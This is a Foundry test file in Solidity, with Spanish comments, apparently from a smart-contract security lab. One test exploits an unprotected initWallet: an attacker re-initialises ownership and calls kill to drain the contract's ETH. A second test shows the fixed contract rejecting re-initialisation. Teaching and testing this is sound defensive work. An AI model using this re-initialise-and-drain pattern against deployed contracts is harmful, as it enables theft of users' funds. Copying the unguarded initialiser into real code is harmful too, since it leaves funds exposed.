// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {WalletLibrary} from "../../src/access-control/target/WalletLibrary.sol";
import {WalletLibraryFixed} from "../../src/access-control/mitigations/WalletLibraryFixed.sol";

contract AccessControl03Test is Test {
    WalletLibrary walletLibrary;
    WalletLibraryFixed walletLibraryFixed;

    address legitOwner = makeAddr("legitOwner");
    address legitUser = makeAddr("legitUser");
    address attacker = makeAddr("attacker");

    function setUp() public {
        walletLibrary = new WalletLibrary();
        walletLibraryFixed = new WalletLibraryFixed();

        // alguien deposita ETH en el contrato, que ya esta "en uso"
        vm.deal(legitUser, 4 ether);
        vm.prank(legitUser);
        walletLibrary.deposit{value: 4 ether}();

        vm.deal(legitUser, 4 ether);
        vm.prank(legitUser);
        walletLibraryFixed.deposit{value: 4 ether}();

        // el owner legitimo ya inicializo el contrato antes de que actue el atacante
        walletLibrary.initWallet(legitOwner);
        walletLibraryFixed.initWallet(legitOwner);
    }

    /// @dev initWallet() no comprueba nada: el atacante puede volver a llamarla
    ///      para usurpar la propiedad de un contrato que ya tenia owner, y a
    ///      continuacion usar esa propiedad recien robada para vaciarlo.
    function test_exploit_unprotectedInit() public {
        uint256 stolen = address(walletLibrary).balance;
        assertEq(stolen, 4 ether);
        assertEq(walletLibrary.owner(), legitOwner);

        vm.startPrank(attacker);
        walletLibrary.initWallet(attacker);
        walletLibrary.kill(payable(attacker));
        vm.stopPrank();

        assertEq(attacker.balance, stolen);
    }

    function test_mitigation_blocksUnprotectedInit() public {
        assertEq(walletLibraryFixed.owner(), legitOwner);

        vm.prank(attacker);
        vm.expectRevert(bytes("Already initialized"));
        walletLibraryFixed.initWallet(attacker);

        assertEq(walletLibraryFixed.owner(), legitOwner, "la propiedad no debe cambiar");
    }
}
